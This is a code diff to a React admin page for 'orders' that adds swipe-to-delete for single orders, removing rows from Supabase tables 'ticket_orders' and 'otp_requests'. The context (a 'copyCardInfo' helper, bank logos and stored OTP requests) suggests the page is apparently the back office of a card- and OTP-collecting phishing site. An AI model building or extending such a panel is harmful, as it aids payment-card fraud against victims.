@@ -1,4 +1,4 @@
-import { useEffect, useState } from "react";
+import { useEffect, useState, useCallback } from "react";
 import { motion } from "framer-motion";
 import { supabase } from "@/integrations/supabase/client";
 import { format } from "date-fns";
@@ -13,6 +13,7 @@ import html2canvas from "html2canvas";
 import ExportButtons from "@/components/admin/ExportButtons";
 import { playChime } from "@/hooks/use-action-sound";
 import { bankLogos, bankColors, bankUIColors } from "@/data/bankLogos";
+import SwipeToDelete from "@/components/admin/SwipeToDelete";
 import {
   AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent,
   AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle,
@@ -74,6 +75,19 @@ const AdminOrders = () => {
       toast.error("حدث خطأ أثناء المسح");
     }
   };
+
+  const deleteSingleOrder = useCallback(async (id: string) => {
+    playChime("delete");
+    if (navigator.vibrate) navigator.vibrate(100);
+    try {
+      await supabase.from("otp_requests").delete().eq("order_id", id);
+      await supabase.from("ticket_orders").delete().eq("id", id);
+      setOrders(prev => prev.filter(o => o.id !== id));
+      toast.success("تم حذف الطلب");
+    } catch {
+      toast.error("حدث خطأ أثناء الحذف");
+    }
+  }, []);
 
   const copyCardInfo = (order: Order) => {
     const parts: string[] = [];
@@ -429,8 +443,8 @@ const AdminOrders = () => {
             const bankC = o.bank_name ? bankUIColors[o.bank_name] : null;
 
             return (
+              <SwipeToDelete key={o.id} onDelete={() => deleteSingleOrder(o.id)}>
               <div
-                key={o.id}
                 className={`bg-white rounded-2xl border overflow-hidden transition-all duration-300 hover:shadow-lg hover:-translate-y-0.5 ${
                   isPending ? "border-amber-200/80 shadow-sm shadow-amber-100/50" : bankC ? `${bankC.border}/80` : "border-slate-100/80 hover:shadow-slate-200/60"
                 }`}
@@ -616,6 +630,7 @@ const AdminOrders = () => {
                   )}
                 </div>
               </div>
+              </SwipeToDelete>
             );
           })
         )}
